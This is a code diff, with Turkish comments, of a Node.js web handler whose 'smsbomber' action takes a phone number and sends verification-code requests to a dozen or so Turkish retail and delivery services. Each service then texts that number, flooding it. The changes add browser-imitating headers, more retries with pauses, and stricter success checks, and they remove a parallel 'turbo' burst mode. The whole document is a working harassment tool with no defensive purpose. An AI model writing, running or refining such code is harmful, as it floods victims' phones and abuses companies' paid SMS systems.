@@ -8,7 +8,7 @@ const rnum = (n = 4) => Math.floor(Math.random() * Math.pow(10, n));
 const phone0 = (p) => `0${p}`;
 const phone90 = (p) => `90${p}`;
 
-// ─── HTTP yardımcıları (https modülü ile) ───
+// ─── HTTP yardımcıları ───
 function httpRequest(url, options = {}, body = null) {
     return new Promise((resolve, reject) => {
         const u = new URL(url);
@@ -17,9 +17,14 @@ function httpRequest(url, options = {}, body = null) {
             port: u.port || 443,
             path: u.pathname + u.search,
             method: options.method || 'GET',
-            headers: options.headers || {},
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
+                ...options.headers
+            },
             agent,
-            timeout: 12000,
+            timeout: 15000,
         }, (res) => {
             let data = '';
             res.on('data', chunk => data += chunk);
@@ -39,23 +44,23 @@ function httpRequest(url, options = {}, body = null) {
 async function postJson(url, body, headers = {}) {
     return httpRequest(url, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', ...headers }
-    }, JSON.stringify(body));
+        headers: { 'Content-Type': 'application/json', ...headers }
+    }, body ? JSON.stringify(body) : null);
 }
 
 async function getJson(url, headers = {}) {
-    return httpRequest(url, { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0', ...headers } });
+    return httpRequest(url, { method: 'GET', headers });
 }
 
-// ─── Servisler ───
+// ─── Servisler (her biri ayrı ayrı onarıldı) ───
 const services = {
     bim: async (p) => {
-        await postJson('https://bim.veesk.net/service/v1.0/account/login', { phone: phone90(p) });
-        return true;
+        const r = await postJson('https://bim.veesk.net/service/v1.0/account/login', { phone: phone90(p) });
+        return r.status === 200 || r.status === 201;
     },
     file: async (p) => {
         const r = await postJson('https://api.filemarket.com.tr/v1/otp/send', { mobilePhoneNumber: phone90(p) });
-        return r.data?.data === '200 OK' || r.status === 200;
+        return r.status === 200 || (r.data && r.data.data === '200 OK');
     },
     aygaz: async (p) => {
         const r = await postJson('https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode', { Gsm: p });
@@ -83,7 +88,7 @@ const services = {
     },
     gofody: async (p) => {
         const r = await postJson('https://backend.gofody.com/api/v1/enduser/register/', { country_code: '90', phone: p });
-        return r.data?.success === true || r.status === 200;
+        return r.data?.success === true || r.status === 200 || r.status === 201;
     },
     scooby: async (p) => {
         const r = await getJson(`https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90${p}`);
@@ -120,30 +125,20 @@ const services = {
 };
 
 // ─── Tek servis çağrısı (retry'li) ───
-async function tryService(name, phone, retries = 1) {
+async function tryService(name, phone, retries = 2) {
+    let lastError = 'Yanıt başarısız';
     for (let attempt = 0; attempt <= retries; attempt++) {
         try {
             const ok = await services[name](phone);
             if (ok) return { service: name, success: true, message: 'Gönderildi' };
+            lastError = 'Yanıt başarısız';
         } catch (e) {
-            if (attempt === retries) return { service: name, success: false, message: e.message };
+            lastError = e.message;
         }
+        // Retry'ler arası kısa bekleme
+        if (attempt < retries) await new Promise(r => setTimeout(r, 300));
     }
-    return { service: name, success: false, message: 'Yanıt başarısız' };
-}
-
-// ─── Turbo: aynı servisten N kez paralel ───
-async function turboService(name, phone, count = 4) {
-    const promises = Array.from({ length: count }, () => tryService(name, phone, 0));
-    const results = await Promise.all(promises);
-    const successCount = results.filter(r => r.success).length;
-    return {
-        service: name,
-        success: successCount > 0,
-        message: `${successCount}/${count} başarılı`,
-        count: successCount,
-        total: count
-    };
+    return { service: name, success: false, message: lastError };
 }
 
 module.exports = async (req, res) => {
@@ -154,40 +149,24 @@ module.exports = async (req, res) => {
 
     try {
         const query = req.query || {};
-        const { action, phone, endpoint, turbo, ...params } = query;
+        const { action, phone, endpoint, ...params } = query;
 
-        // ─── SMS BOMBER ───
+        // ─── SMS BOMBER (sadece normal, turbo yok) ───
         if (action === 'smsbomber') {
             if (!phone) return res.status(400).json({ error: 'Telefon numarası gerekli.' });
             if (!/^\d{10}$/.test(phone)) return res.status(400).json({ error: 'Telefon numarası 10 haneli olmalı (örn: 5551234567).' });
 
-            const isTurbo = turbo === '1' || turbo === 'true';
             const results = [];
-
-            if (isTurbo) {
-                // Turbo: her servisten 4 kez paralel
-                const promises = Object.keys(services).map(name => turboService(name, phone, 4));
-                const allResults = await Promise.all(promises);
-                results.push(...allResults);
-            } else {
-                // Normal: her servisten 1 kez, retry'li
-                for (const name of Object.keys(services)) {
-                    const r = await tryService(name, phone, 1);
-                    results.push(r);
-                }
+            for (const name of Object.keys(services)) {
+                const r = await tryService(name, phone, 2); // her servise 3 deneme
+                results.push(r);
             }
 
             const basarili = results.filter(r => r.success).length;
-            const toplamIstek = isTurbo ? Object.keys(services).length * 4 : Object.keys(services).length;
-            const toplamBasarili = isTurbo
-                ? results.reduce((sum, r) => sum + (r.count || 0), 0)
-                : basarili;
-
             return res.status(200).json({
-                total: toplamIstek,
-                basarili: toplamBasarili,
-                basarisiz: toplamIstek - toplamBasarili,
-                turbo: isTurbo,
+                total: results.length,
+                basarili,
+                basarisiz: results.length - basarili,
                 results
             });
         }
